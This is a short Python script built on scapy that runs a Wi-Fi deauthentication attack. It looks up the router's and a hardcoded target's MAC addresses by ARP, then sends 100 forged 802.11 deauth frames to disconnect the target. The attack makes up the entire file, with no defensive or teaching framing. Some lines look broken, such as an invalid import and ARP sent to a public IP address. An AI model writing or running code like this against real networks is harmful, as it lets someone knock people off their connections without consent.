from scapy.all import scapy
import scapy.all as scapy

def  disconnect_user(mac_address, access_point, interface):
    
    packet = scapy.RadioTap() /  scapy.Dot11(addr1 = mac_address, addr2 = access_point,addr3 = access_point) / scapy.Dot11Deauth(reason = 7)
    scapy.sendp(packet, inter = 0.01, count = 100, iface = interface, verbose = 1)
    
def get_mac_address(ip_address):
    
    arp_request = scapy.ARP(pdst = ip_address)
    arp_response = scapy.sr1(arp_request, timeout = 1, verbose = False)
    
    if arp_response is not None:
        
        return arp_response.hwsrc
    else:
        return None

def getting_ip_of_access_point():
    
    print(scapy.conf.route.route("8.8.8.8"))
    p = scapy.conf.route.route("8.8.8.8")[2]
    print(p)
    return p

def getting_ip_of_this_device():
    
    d = scapy.conf.route.route("8.8.8.8")[1]
    print(d)
    return d

def getting_interface(ipaddress):
    
    for interface in  scapy.ifaces.values():
        if interface.ip == ipaddress:
            return{"name":interface.name, "mac": interface.mac}
        
if __name__ == "__main__":
    
    devcip = '105.231.253.101'
    router_ip = getting_ip_of_access_point()
    interface = getting_interface(getting_ip_of_this_device())
    mac_address_access_point = get_mac_address(router_ip)
    mac_address_device = get_mac_address(devcip)
    
    print("MAC Address of Acess Point: ", mac_address_access_point)
    print("Starting Deauthentication Attack on Device:", mac_address_device)
    
    disconnect_user(mac_address_device, mac_address_access_point,interface['name'])